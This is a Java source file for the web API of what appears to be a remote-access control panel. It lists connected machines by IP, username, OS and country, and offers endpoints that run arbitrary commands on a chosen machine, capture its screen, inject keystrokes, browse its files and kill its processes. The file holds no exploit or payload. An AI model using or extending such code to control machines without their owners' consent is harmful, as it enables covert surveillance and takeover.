package electron.web.pages;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Comparator;
import java.util.TreeMap;

import javax.imageio.ImageIO;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import com.sun.net.httpserver.HttpHandler;

import electron.actions.Explorer;
import electron.actions.Misc;
import electron.actions.Taskmgr;
import electron.networking.NetData;
import electron.networking.SocketHandler;
import electron.networking.packets.ExplorerPacketInput;
import electron.networking.packets.OutputPacket;
import electron.networking.packets.ProcessPacket;
import electron.utils.logger;
import electron.web.Loader;
import electron.web.WebUtils;
import javafx.collections.FXCollections;

public class API {
	public static API_GetConnections getConnections() {
		return new API_GetConnections();
	}

	public static API_GetSocketAPI GetSocketAPI() {
		return new API_GetSocketAPI();
	}
}

@SuppressWarnings("unchecked")
class API_GetConnections implements HttpHandler {
	@Override
	public void handle(com.sun.net.httpserver.HttpExchange exchange) throws IOException {
		if (!Loader.checkAuth(exchange)) {
			return;
		}
		JSONArray arr = new JSONArray();
		if (!NetData.getClients().isEmpty()) {
			for (SocketHandler handler : NetData.getClients()) {
				if (handler.getInfo() == null) {
					continue;
				}
				JSONObject socket = new JSONObject();
				socket.put("col1", handler.getInfo().getAddress());
				socket.put("col2", handler.getInfo().getUsername());
				socket.put("col3", handler.getInfo().getOs());
				socket.put("col4", handler.getInfo().getCountry());
				socket.put("col5", handler.getInfo().getNativeimage());
				socket.put("col6", "Developing...");
				TreeMap<String, Object> sortedJsonObject = new TreeMap<>(socket);
				arr.add(sortedJsonObject);
			}
		}
		WebUtils.sendResponse(exchange, arr.toJSONString(), 200);
	}
}

@SuppressWarnings("unchecked")
class API_GetSocketAPI implements HttpHandler {
	@Override
	public void handle(com.sun.net.httpserver.HttpExchange exchange) throws IOException {
		if (!Loader.checkAuth(exchange)) {
			return;
		}
		// Getting socket
		String url = WebUtils.getUrl(exchange);
		SocketHandler handler = WebUtils.defineHandler(url);
		url = url.toLowerCase();
		if (handler == null) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "404 - socket not found");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 404);
			return;
		}
		try {
			if (url.contains("/taskmgrfast")) {
				getTaskMgr(exchange, handler, true);
				return;
			}
			if (url.contains("/taskmgr")) {
				getTaskMgr(exchange, handler, false);
				return;
			}
			if (url.contains("/killproc_name")) {
				killproc(exchange, handler, false);
				return;
			}
			if (url.contains("/killproc_pid")) {
				killproc(exchange, handler, true);
				return;
			}
			if (url.contains("/cmd")) {
				executeCommand(exchange, handler);
				return;
			}
			if (url.contains("/console")) {
				getConsole(exchange, handler);
				return;
			}
			if (url.contains("/screen")) {
				getScreen(exchange, handler);
				return;
			}
			if (url.contains("/presskeys")) {
				pressKeys(exchange, handler);
				return;
			}
			if (url.contains("/explorer")) {
				getExplorer(exchange, handler);
				return;
			}
		} catch (Exception e) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "520 - unknown error");
			erranswer.put("error_message", e.getMessage());
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 520);
			return;
		}
		// Command not found
		JSONObject erranswer = new JSONObject();
		erranswer.put("message", "400 - command not found");
		WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
	}

	private static void getExplorer(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler) {
		String url = WebUtils.getUrl(exchange);
		if (!url.contains("&path=")) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "400 - incorrect request");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
			return;
		}
		String path = url.split("&path=")[1];
		path = path.replaceAll("splitter", "/");
		Explorer.updateExplorer(handler, path);
		ExplorerPacketInput inpacket = handler.getExplorerInfo();
		if (inpacket == null || inpacket.getFiles().isEmpty()) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "204 - no content");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 204);
			return;
		}
		JSONArray arr = new JSONArray();
		for (Object item : inpacket.getFiles()) {
			JSONObject item1 = new JSONObject();
			item1.put("col1", String.valueOf(item));
			arr.add(item1);
		}
		WebUtils.sendResponse(exchange, arr.toJSONString(), 200);
	}

	private static void pressKeys(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler) {
		String url = WebUtils.getUrl(exchange);
		if (!url.contains("&keys=")) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "400 - incorrect request");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
			return;
		}
		String keys = url.split("&keys=")[1];
		Misc.presskeys(handler, keys);
		JSONObject answer = new JSONObject();
		answer.put("message", "202 - accepted");
		WebUtils.sendResponse(exchange, answer.toJSONString(), 202);
	}

	private static void getScreen(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler) {
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			BufferedImage screen = handler.getScreen();
			ImageIO.write(screen, "jpg", baos);
			baos.flush();
			byte[] imageData = baos.toByteArray();
			baos.close();
			exchange.getResponseHeaders().set("Content-Type", "image/jpeg");
			exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
			exchange.sendResponseHeaders(200, imageData.length);
			OutputStream os = exchange.getResponseBody();
			os.write(imageData);
			os.close();
			exchange.close();
		} catch (Exception e) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "500 -  Internal Server Error");
			erranswer.put("error_message", e.getMessage());
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 500);
		}
	}

	private static void getConsole(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler) {
		String result = "";
		for (String str : handler.getMessages()) {
			result += str + "\n";
		}
		JSONObject answer = new JSONObject();
		answer.put("message", result);
		WebUtils.sendResponse(exchange, answer.toJSONString(), 200);
	}

	private static void executeCommand(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler) {
		String url = WebUtils.getUrl(exchange);
		if (!url.contains("&command=")) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "400 - incorrect request");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
			return;
		}
		String command = url.split("&command=")[1];
		handler.addMessageToLog("[SERVER]: sending: " + command);
		if (OutputPacket.sendOutPacket(command, handler)) {
			JSONObject answer = new JSONObject();
			answer.put("message", "202 - accepted");
			WebUtils.sendResponse(exchange, answer.toJSONString(), 202);
		} else {
			handler.addMessageToLog("[SERVER]: error sending command: " + command);
			JSONObject answer = new JSONObject();
			answer.put("message", "503 - service unavailable");
			WebUtils.sendResponse(exchange, answer.toJSONString(), 503);
		}
	}

	private static void killproc(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler, boolean isPid) {
		String url = WebUtils.getUrl(exchange);
		if (!url.contains("&kill=")) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "400 - incorrect request");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
			return;
		}
		String proc = url.split("&kill=")[1];
		JSONObject answer = new JSONObject();
		answer.put("message", "202 - accepted");
		try {
			if (isPid) {
				Taskmgr.killProcess_PID(proc.split(",")[0], handler);
				WebUtils.sendResponse(exchange, answer.toJSONString(), 202);
			} else {
				Taskmgr.killProcess_NAME(proc.split(",")[1], handler);
				WebUtils.sendResponse(exchange, answer.toJSONString(), 202);
			}
		} catch (Exception e) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "400 - incorrect request");
			erranswer.put("error_message", e.getMessage());
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 400);
		}
	}

	private static void getTaskMgr(com.sun.net.httpserver.HttpExchange exchange, SocketHandler handler,
			boolean isFast) {
		if (handler.getTaskList().isEmpty()) {
			JSONObject erranswer = new JSONObject();
			erranswer.put("message", "523 - tasklist is empty");
			WebUtils.sendResponse(exchange, erranswer.toJSONString(), 523);
			Taskmgr.requestData(handler, isFast);
			return;
		}
		JSONArray arr = new JSONArray();
		for (ProcessPacket proc : handler.getTaskList()) {
			JSONObject procObj = new JSONObject();
			procObj.put("col1", proc.getPid().get());
			procObj.put("col2", proc.getName().get());
			procObj.put("col3", proc.getUser().get());
			procObj.put("col4", proc.getState().get());
			procObj.put("col5", proc.getMemory().get());
			procObj.put("col6", proc.getSession().get());
			procObj.put("col7", proc.getTitle().get());
			TreeMap<String, Object> sortedJsonObject = new TreeMap<>(procObj);
			arr.add(sortedJsonObject);
		}
		WebUtils.sendResponse(exchange, arr.toJSONString(), 200);
		Taskmgr.requestData(handler, isFast);
	}
}
